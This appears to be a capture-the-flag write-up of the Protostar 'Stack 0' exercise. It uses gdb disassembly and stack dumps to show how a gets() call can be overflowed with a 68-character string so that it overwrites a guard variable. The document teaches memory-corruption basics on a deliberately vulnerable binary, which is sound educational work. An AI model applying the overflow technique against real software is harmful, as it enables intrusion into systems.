# Stack 0
## Tools used
- gdb (gef)
## Recon
We start off with what looks to be a simple Stack Overflow. Booting up gdb, let's see what we're working with
```shell
gef➤  info functions

File stack0/stack0.c:
5:	int main(int, char **);

Non-debugging symbols:
0x080482bc  _init
0x080482fc  __gmon_start__@plt
0x0804830c  gets@plt
0x0804831c  __libc_start_main@plt
0x0804832c  puts@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x08048440  __libc_csu_fini
0x08048450  __libc_csu_init
0x080484aa  __i686.get_pc_thunk.bx
0x080484b0  __do_global_ctors_aux
0x080484dc  _fini
```

The item of interest here is the function main. Let's set a breakpoint, run gdb, and then peek at the disassembly

```shell
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	and    esp,0xfffffff0
   0x080483fa <+6>:	sub    esp,0x60
=> 0x080483fd <+9>:	mov    DWORD PTR [esp+0x5c],0x0
   0x08048405 <+17>:	lea    eax,[esp+0x1c]
   0x08048409 <+21>:	mov    DWORD PTR [esp],eax
   0x0804840c <+24>:	call   0x804830c <gets@plt>
   0x08048411 <+29>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:	test   eax,eax
   0x08048417 <+35>:	je     0x8048427 <main+51>
   0x08048419 <+37>:	mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:	call   0x804832c <puts@plt>
   0x08048425 <+49>:	jmp    0x8048433 <main+63>
   0x08048427 <+51>:	mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:	call   0x804832c <puts@plt>
   0x08048433 <+63>:	leave
   0x08048434 <+64>:	ret
End of assembler dump.
```

Here's the rundown:
- stack initialzation, alignment, and allocation
- storing hex 0 in a variable [esp+0x5c]
- storing the effective address of said variable into eax
- moving eax to the stack at [esp+0x1c] for the following:
- gets function call (naughty naughty)
- storing our [esp+0x5c] variable to the eax register
- testing eax against itself (bitwise and), should always set the zero flag since eax = [esp+0x5c] = 0
- jumps to memory location 0x08048427, pushes a string at memory location 0x8048529 to the stack in anticipation of the puts call
- puts (prints) whatever string is at the address 0x8048529 in the binary's data section


To reiterate, our variable [esp+0x5c] is initialized to 0 and there is nothing in this binary that will organically change [esp+0x5c]'s value. [esp+0x5c] will always set our eax register to zero meaning that when test eax,eax is called, the zero flag will always be set; we will always get sucked into the je <main+51> operation; we will always fail to reach the area in memory between 0x08048419 and 0x08048425
```shell
   0x08048419 <+37>:	mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:	call   0x804832c <puts@plt>
   0x08048425 <+49>:	jmp    0x8048433 <main+63>
```
This right here is where we want to be, and that je call at 0x08048417 is gatekeeping us hard.

## Method

Here's what we need to do to avoid that je operation
- can patch out the binary like a coward
- can use the gets function call to overflow the stack, spilling into variable [esp+0x5c] which stops setting eax to 0 and the zero flag won't get set during the test operation

First let's get a better look at the stack:
```shell
gef➤  x/24w $esp
0xffffd180:	0xffffd19c	0xf7fc9694	0xf7ffd608	0x0
0xffffd190:	0xf7ffcff4	0x2c	0x0	0xffffdfcd
0xffffd1a0:	0xf7fc7550	0x0	0xf7da1a4f	0xf7fa2048
0xffffd1b0:	0xf7fc14b0	0xf7fd97cb	0xf7da1a4f	0xf7fc14b0
0xffffd1c0:	0xffffd200	0xf7fc1688	0xf7fc1b40	0x1
0xffffd1d0:	0x1	0x0	0x0	0x0
```
It's a little ugly but here's the first 24 hex dwords (4 bytes each) off our stack pointer (esp). We know that eax is at [esp+0x1c] and our 0 variable is at [esp+0x5c]. The difference between these 2 addresses is 0x40, or 64 in decimal. That means if we pass a string with 64 + 4 characters to the binary, we'll completely fill all 4 bytes of [esp+0x5c] (and everything in between it and eax). We can quickly generate a little script in the command line like:

```shell
python3 -c "print('A'*64)"
```

but if we vary the characters it will make more sense when I print the stack again in a second. 

```python3
str_ = ""
for i in range(17):
    str_ += (chr(ord('A') + i)) * 4
print(str_)
```

which gives us AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ. Let's plug that into our binary and take a look at what the stack looks like!

```shell
gef➤  x/24w $esp
0xffffd180:	0xffffd19c	0xf7fc9694	0xf7ffd608	0x00000000
0xffffd190:	0xf7ffcff4	0x0000002c	0x00000000	0x41414141
0xffffd1a0:	0x42424242	0x43434343	0x44444444	0x45454545
0xffffd1b0:	0x46464646	0x47474747	0x48484848	0x49494949
0xffffd1c0:	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d
0xffffd1d0:	0x4e4e4e4e	0x4f4f4f4f	0x50505050	0x51515151
```

As we can see, each collection of 4 bytes starting from the 0x41414141 (eax location) all the way to 0x51515151 ([esp+0x5c]) are the characters AAAA -> QQQQ.
We've successfuly overflowed the stack! Now our variable [esp+0x5c] (which should always be zero) has a value of 0x51515151 or QQQQ!

```shell
gef➤  x/s $esp+0x5c
0xffffd1dc:	"QQQQ"
```

This means that when test eax,eax is called, the zero flag won't be set, and the jump if equal condition will fail. Our code will continue running and we'll be rewarded with:

```shell
you have changed the 'modified' variable
```
